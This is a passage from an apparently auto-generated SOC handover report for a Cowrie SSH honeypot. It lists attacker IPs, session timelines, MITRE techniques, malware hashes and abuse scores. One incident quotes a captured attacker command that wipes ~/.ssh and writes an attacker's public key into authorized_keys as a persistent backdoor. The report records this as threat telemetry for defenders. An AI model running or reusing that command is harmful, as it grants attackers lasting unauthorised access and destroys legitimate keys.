| `2026-04-12 22:29:04` | `cowrie.command.failed` |
| `2026-04-12 22:29:04` | `cowrie.log.closed` |
| `2026-04-12 22:29:04` | `cowrie.session.params` |
| `2026-04-12 22:29:04` | `cowrie.command.input` |
| `2026-04-12 22:29:04` | `cowrie.session.file_download` |
| `2026-04-12 22:29:04` | `cowrie.log.closed` |
| `2026-04-12 22:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.115.183[.]206` to AbuseIPDB if not already reported
- [ ] Block `39.115.183[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac571fd7e269

| Field | Detail |
|---|---|
| **Source IP** | `39.115.183[.]206` |
| **First Seen** | 2026-04-12 22:29 |
| **Last Seen** | 2026-04-12 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:29:07` | `cowrie.session.connect` |
| `2026-04-12 22:29:07` | `cowrie.client.version` |
| `2026-04-12 22:29:07` | `cowrie.client.kex` |
| `2026-04-12 22:29:07` | `cowrie.login.success` |
| `2026-04-12 22:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.115.183[.]206` to AbuseIPDB if not already reported
- [ ] Block `39.115.183[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a08c98feba1

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]110` |
| **First Seen** | 2026-04-12 22:31 |
| **Last Seen** | 2026-04-12 22:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:31:28` | `cowrie.session.connect` |
| `2026-04-12 22:31:28` | `cowrie.client.version` |
| `2026-04-12 22:31:28` | `cowrie.client.kex` |
| `2026-04-12 22:31:29` | `cowrie.login.success` |
| `2026-04-12 22:31:29` | `cowrie.session.params` |
| `2026-04-12 22:31:29` | `cowrie.command.input` |
| `2026-04-12 22:31:29` | `cowrie.command.failed` |
| `2026-04-12 22:31:29` | `cowrie.log.closed` |
| `2026-04-12 22:31:30` | `cowrie.session.params` |
| `2026-04-12 22:31:30` | `cowrie.command.input` |
| `2026-04-12 22:31:30` | `cowrie.session.file_download` |
| `2026-04-12 22:31:30` | `cowrie.log.closed` |
| `2026-04-12 22:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]110` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffca2e8e107

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]110` |
| **First Seen** | 2026-04-12 22:31 |
| **Last Seen** | 2026-04-12 22:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:31:32` | `cowrie.session.connect` |
| `2026-04-12 22:31:32` | `cowrie.client.version` |
| `2026-04-12 22:31:32` | `cowrie.client.kex` |
| `2026-04-12 22:31:33` | `cowrie.login.success` |
| `2026-04-12 22:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]110` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.210.149[.]130` | **25** | 2026-04-12 21:42 | 2026-04-12 22:28 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `13.81.183[.]28` | **25** | 2026-04-12 20:43 | 2026-04-12 21:00 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.32.186[.]46` | **25** | 2026-04-12 21:40 | 2026-04-12 22:22 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.174.238[.]116` | **25** | 2026-04-12 20:43 | 2026-04-12 21:23 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.143.162[.]210` | **6** | 2026-04-12 21:28 | 2026-04-12 21:34 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `106.12.168[.]187` | **2** | 2026-04-12 22:29 | 2026-04-12 22:31 | 2m | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | **2** | 2026-04-12 21:39 | 2026-04-12 21:41 | 4m | 0 | `T1592` | 🟢 LOW |
| `113.62.174[.]87` | 1 | 2026-04-12 21:34 | 2026-04-12 21:34 | 8s | 0 | `T1592` | 🟢 LOW |
| `114.216.4[.]149` | 1 | 2026-04-12 22:29 | 2026-04-12 22:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.196.73[.]14` | 1 | 2026-04-12 21:32 | 2026-04-12 21:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.99.133[.]77` | 1 | 2026-04-12 22:28 | 2026-04-12 22:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.112[.]110` | 1 | 2026-04-12 22:31 | 2026-04-12 22:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.76[.]60` | 1 | 2026-04-12 21:44 | 2026-04-12 21:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.7.3[.]26` | 1 | 2026-04-12 21:31 | 2026-04-12 21:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-12 21:35 | 2026-04-12 21:35 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]16` | 1 | 2026-04-12 21:42 | 2026-04-12 21:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `201.71.192[.]108` | 1 | 2026-04-12 22:30 | 2026-04-12 22:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.187.100[.]82` | 1 | 2026-04-12 21:31 | 2026-04-12 21:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.138.202[.]60` | 1 | 2026-04-12 20:44 | 2026-04-12 20:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.115.183[.]206` | 1 | 2026-04-12 22:29 | 2026-04-12 22:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.169.128[.]70` | 1 | 2026-04-12 22:27 | 2026-04-12 22:28 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.79.175[.]83` | 1 | 2026-04-12 20:43 | 2026-04-12 20:44 | 31s | 0 | `T1592` | 🟢 LOW |
| `51.195.138[.]37` | 1 | 2026-04-12 22:31 | 2026-04-12 22:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.177.101[.]45` | 1 | 2026-04-12 22:29 | 2026-04-12 22:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.79.175[.]83` | US | Linode | **100** ⚠️ | 1 |
| `102.210.149[.]130` | KE | New IP First Block2 | **100** ⚠️ | 11 |
| `152.32.186[.]46` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 8 |
| `14.103.112[.]110` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `113.62.174[.]87` | CN | CHINANET XIZANG PROVINCE NETWORK | **100** ⚠️ | 12 |
| `118.196.73[.]14` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `13.81.183[.]28` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `36.138.202[.]60` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `187.174.238[.]116` | MX | Uninet S.A. de C.V. | **100** ⚠️ | 50 |
| `139.99.133[.]77` | AU | OVH Australia PTY LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 213 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 109 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 95 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 48 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 48 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 223 cases |
| Tool 34  | Credential Extractor        | ✅ 208 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (0.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 95 priority case(s) shown individually · 24 recon entry/entries in table (7 group(s) consolidating 110 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T22:32:47Z_
